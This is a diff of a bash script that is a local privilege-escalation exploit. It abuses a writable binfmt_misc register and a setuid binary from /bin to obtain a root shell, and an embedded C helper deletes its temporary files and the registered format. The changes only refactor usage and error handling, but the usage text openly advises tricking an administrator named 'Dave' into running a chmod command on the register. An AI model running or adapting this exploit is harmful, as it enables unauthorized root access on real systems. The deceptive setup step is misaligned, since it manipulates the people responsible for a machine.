@@ -2,13 +2,31 @@
 
 searchsuid="/bin/"
 mountpoint="/proc/sys/fs/binfmt_misc"
+exe="$0"
 
-test -n "$1" && echo -e "" \
-"Usage: $0 \n"\
-"\tGives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable,\n"\
-"\tnote that it must be enforced by any other mean before your try this, for\n"\
-"\texample by typing something like \"sudo chmod +6 /*/*/f*/*/*r\" while Dave\n"\
-"\tis thinking that you are fixing his problem.\n" && exit 0
+
+warn()
+{
+    1>&2 echo $@
+}
+
+die()
+{
+    warn $@
+    exit -1
+}
+
+usage()
+{
+    cat <<EOF
+Usage: $exe
+    Gives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable,
+    note that it must be enforced by any other mean before your try this, for
+    example by typing something like "sudo chmod +6 /*/*/f*/*/*r" while Dave is
+    thinking that you are fixing his problem.
+EOF
+    exit 1
+}
 
 function not_writeable()
 {
@@ -31,7 +49,9 @@ function read_magic()
 	python2 -c "print(open('$1', 'rb').read()[:$2].replace('"'\x00'"', '"'\\x00'"'))"
 }
 
-not_writeable && echo "Error: $mountpoint/register is not writeable" && exit 1
+[[ -n "$1" ]] && usage
+
+not_writeable && die "Error: $mountpoint/register is not writeable"
 
 target="$(pick_suid "$searchsuid")"
 test -z "$target" && echo "Error: Unable to find a suid binary in $searchsuid" && exit 1
@@ -50,11 +70,11 @@ fmtinterpr="$(mktemp)"
 	#include <pwd.h>
 
 	int main(int argc, char *argv[])
-	{	
+	{
 		// remove our temporary files
 		unlink("$fmtsrc");
 		unlink("$fmtinterpr");
-		
+
 		// remove the unused binary format
 		FILE* fmt = fopen("$mountpoint/$fmtname", "w");
 		fprintf(fmt, "-1\\n");
